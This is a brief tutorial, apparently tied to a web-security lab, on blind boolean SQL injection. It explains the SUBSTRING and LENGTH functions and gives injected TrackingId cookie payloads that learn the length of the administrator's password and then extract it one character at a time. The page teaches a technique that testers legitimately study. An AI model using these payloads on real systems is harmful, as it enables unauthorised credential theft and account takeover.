---

# Advanced String Extraction: Character Parsing and Selection Logic

Once a boolean conditional response vector is confirmed, data extraction can be performed by isolating single text characters from database columns, converting them into clear structural data via parsing strings.

## 🛠️ The `SUBSTRING` Isolation Blueprint
The `SUBSTRING` function acts as a precision tool to extract a targeted chunk of text from a string based on a specified starting position and character length.

### Syntax Breakdown
```sql
SUBSTRING(expression, start_position, length)
Expression: The source text column or string being targeted (e.g., password).
Start Position: The specific index location of the character to isolate (1-indexed).
Length: The total character count to extract (set to 1 for character-by-character analysis).
 Target Password Column: [  a  |  b  |  c  |  @  |  1  |  2  |  3  ]
                          ^     ^     ^     ^     ^     ^     ^
 Index Position:          1     2     3     4     5     6     7

 Payload: SUBSTRING(password, 1, 1) => Extracts 'a'
 Payload: SUBSTRING(password, 4, 1) => Extracts '@'
 Step-by-Step Data Exfiltration Protocol
Phase 1: Determining Target Password Length
Before extracting individual characters, the absolute length of the string must be determined using the LENGTH() function:
TrackingId=xyz' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 20--
The analyst tests values sequentially (20, 21, 22). When the server returns a valid response, the precise length of the string is confirmed.
Phase 2: Sequential Character Matching
Using the isolated character, the analyst runs alphabetical and numerical comparisons against ASCII character sets:
TrackingId=xyz' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 'a'--
This loop continues until the entire password string is systematically exfiltrated.
